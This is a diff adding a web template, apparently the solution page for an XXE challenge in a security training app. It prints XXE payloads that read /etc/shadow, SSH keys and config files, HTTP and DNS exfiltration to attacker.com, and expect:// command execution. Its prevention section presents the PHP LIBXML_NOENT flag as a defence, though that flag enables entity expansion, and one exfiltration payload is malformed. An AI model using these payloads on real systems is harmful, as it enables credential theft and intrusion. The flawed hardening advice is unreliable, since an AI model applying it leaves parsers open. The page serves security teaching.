@@ -1,0 +1,223 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: XXE Level 3{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header">
+                <h2 class="text-center"><i class="bi bi-check-circle-fill text-success me-2"></i>Solution: Level 3 - XXE SYSTEM Entity Exploitation</h2>
+            </div>
+            <div class="card-body solution-content">
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This level demonstrates advanced XXE exploitation using SYSTEM entities to access various types of system files.
+                    The application processes XML with SYSTEM entity references, allowing attackers to read sensitive files beyond
+                    the basic /etc/passwd file.
+                </p>
+                <p>
+                    The vulnerability allows access to:
+                </p>
+                <ul>
+                    <li>Password shadow files (/etc/shadow)</li>
+                    <li>Network configuration files (/etc/hosts)</li>
+                    <li>System configuration files</li>
+                    <li>Application configuration files</li>
+                    <li>SSH keys and certificates</li>
+                </ul>
+                
+                <h3>Solution</h3>
+                <p>To solve this challenge, craft XML payloads that target specific system files using SYSTEM entities:</p>
+                
+                <div class="alert alert-secondary">
+                    <h5><i class="bi bi-terminal me-2"></i>Payload 1: Reading /etc/shadow</h5>
+                </div>
+                <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE document [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/shadow"&gt;
+]&gt;
+&lt;document&gt;
+    &lt;title&gt;Shadow File Access&lt;/title&gt;
+    &lt;content&gt;&amp;xxe;&lt;/content&gt;
+&lt;/document&gt;</code></pre>
+                
+                <div class="alert alert-secondary">
+                    <h5><i class="bi bi-terminal me-2"></i>Payload 2: Reading /etc/hosts</h5>
+                </div>
+                <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE document [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/hosts"&gt;
+]&gt;
+&lt;document&gt;
+    &lt;title&gt;Network Configuration&lt;/title&gt;
+    &lt;content&gt;&amp;xxe;&lt;/content&gt;
+&lt;/document&gt;</code></pre>
+                
+                <div class="alert alert-secondary">
+                    <h5><i class="bi bi-terminal me-2"></i>Payload 3: Using HTTP Protocol</h5>
+                </div>
+                <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE document [
+    &lt;!ENTITY xxe SYSTEM "http://attacker.com/exfiltrate?data=file:///etc/passwd"&gt;
+]&gt;
+&lt;document&gt;
+    &lt;title&gt;HTTP Exfiltration&lt;/title&gt;
+    &lt;content&gt;&amp;xxe;&lt;/content&gt;
+&lt;/document&gt;</code></pre>
+                
+                <h4>Advanced SYSTEM Entity Techniques:</h4>
+                <ol>
+                    <li><strong>File Protocol:</strong> Use file:// protocol to access local files</li>
+                    <li><strong>HTTP Protocol:</strong> Use http:// protocol for data exfiltration</li>
+                    <li><strong>FTP Protocol:</strong> Use ftp:// protocol in environments that support it</li>
+                    <li><strong>PHP Wrappers:</strong> Use php://filter for advanced file reading</li>
+                    <li><strong>Expect Protocol:</strong> Use expect:// for command execution (if available)</li>
+                </ol>
+                
+                <h3>Target Files for Exploitation</h3>
+                <div class="table-responsive">
+                    <table class="table table-striped">
+                        <thead>
+                            <tr>
+                                <th>File Path</th>
+                                <th>Description</th>
+                                <th>Sensitivity</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>/etc/passwd</td>
+                                <td>User account information</td>
+                                <td>Medium</td>
+                            </tr>
+                            <tr>
+                                <td>/etc/shadow</td>
+                                <td>Password hashes</td>
+                                <td>High</td>
+                            </tr>
+                            <tr>
+                                <td>/etc/hosts</td>
+                                <td>Network host mappings</td>
+                                <td>Medium</td>
+                            </tr>
+                            <tr>
+                                <td>/home/user/.ssh/id_rsa</td>
+                                <td>SSH private keys</td>
+                                <td>Critical</td>
+                            </tr>
+                            <tr>
+                                <td>/etc/nginx/nginx.conf</td>
+                                <td>Web server configuration</td>
+                                <td>High</td>
+                            </tr>
+                            <tr>
+                                <td>/var/www/html/config.php</td>
+                                <td>Application configuration</td>
+                                <td>Critical</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                
+                <h3>Protocol Handlers and Wrappers</h3>
+                <p>Different environments support various protocol handlers:</p>
+                
+                <h4>PHP Environments:</h4>
+                <pre><code>&lt;!-- Read file with base64 encoding --&gt;
+&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;
+
+&lt;!-- Read file with rot13 encoding --&gt;
+&lt;!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=/etc/passwd"&gt;
+
+&lt;!-- Execute commands (if expect is available) --&gt;
+&lt;!ENTITY xxe SYSTEM "expect://id"&gt;</code></pre>
+                
+                <h4>Java Environments:</h4>
+                <pre><code>&lt;!-- Read local files --&gt;
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+
+&lt;!-- NetDoc protocol (older Java versions) --&gt;
+&lt;!ENTITY xxe SYSTEM "netdoc:///etc/passwd"&gt;</code></pre>
+                
+                <h3>Data Exfiltration Techniques</h3>
+                <p>When direct file reading isn't possible, use exfiltration methods:</p>
+                
+                <h4>HTTP-based Exfiltration:</h4>
+                <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE document [
+    &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+    &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'&gt;"&gt;
+    %eval;
+    %exfiltrate;
+]&gt;
+&lt;document&gt;
+    &lt;title&gt;Exfiltration Attack&lt;/title&gt;
+&lt;/document&gt;</code></pre>
+                
+                <h4>DNS-based Exfiltration:</h4>
+                <pre><code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://%file;.attacker.com/'&gt;"&gt;</code></pre>
+                
+                <h3>Real-world Impact</h3>
+                <p>
+                    SYSTEM entity exploitation can lead to:
+                </p>
+                <ul>
+                    <li><strong>Credential Theft:</strong> Access to password files and SSH keys</li>
+                    <li><strong>Configuration Disclosure:</strong> Database credentials and API keys</li>
+                    <li><strong>Source Code Exposure:</strong> Application logic and business secrets</li>
+                    <li><strong>Network Reconnaissance:</strong> Internal network mapping through host files</li>
+                    <li><strong>Privilege Escalation:</strong> Using disclosed credentials for lateral movement</li>
+                </ul>
+                
+                <h3>Prevention</h3>
+                <p>Comprehensive XXE prevention strategies:</p>
+                <ul>
+                    <li><strong>Disable External Entities:</strong> Configure XML parsers to reject all external entity processing</li>
+                    <li><strong>Use Secure Parsers:</strong> Implement XML parsers with built-in XXE protection</li>
+                    <li><strong>Input Validation:</strong> Validate and sanitize all XML input</li>
+                    <li><strong>Least Privilege:</strong> Run applications with minimal file system access</li>
+                    <li><strong>Network Segmentation:</strong> Limit outbound network access from XML processing servers</li>
+                    <li><strong>Monitoring:</strong> Log and monitor XML processing for suspicious patterns</li>
+                </ul>
+                
+                <h4>Secure Configuration Examples:</h4>
+                <div class="alert alert-info">
+                    <h6>Python (xml.etree.ElementTree):</h6>
+                    <pre><code>import xml.etree.ElementTree as ET
+from xml.etree.ElementTree import ParseError
+
+# Secure parser configuration
+parser = ET.XMLParser()
+parser.parser.DefaultHandler = lambda data: None
+parser.parser.ExternalEntityRefHandler = lambda context, base, sysId, notationName: False</code></pre>
+                </div>
+                
+                <div class="alert alert-info">
+                    <h6>PHP (libxml):</h6>
+                    <pre><code>// Disable external entity loading
+libxml_disable_entity_loader(true);
+
+// Or use LIBXML_NOENT flag
+$dom = new DOMDocument();
+$dom-&gt;loadXML($xml, LIBXML_NOENT);</code></pre>
+                </div>
+                
+                <div class="alert alert-info">
+                    <h6>Java (DocumentBuilderFactory):</h6>
+                    <pre><code>DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
+factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);</code></pre>
+                </div>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('xxe_level3') }}" class="btn btn-outline-primary">Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
